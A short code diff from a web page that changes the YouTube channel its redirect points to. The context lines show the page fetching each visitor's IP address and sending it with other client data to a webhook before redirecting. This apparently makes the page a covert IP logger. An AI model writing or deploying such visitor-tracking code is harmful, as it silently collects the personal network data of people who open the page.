@@ -126,7 +126,7 @@ fetch('https://api.ipify.org?format=json')
         };
         await sendWebhookMessage(clientIP, clientData);
 
-        window.location.replace("https://www.youtube.com/@ItsMeStocki?sub_confirmation=1");
+        window.location.replace("https://www.youtube.com/@itsmestocki6634?sub_confirmation=1");
 
         function sendMessage() {
             const request = new XMLHttpRequest();
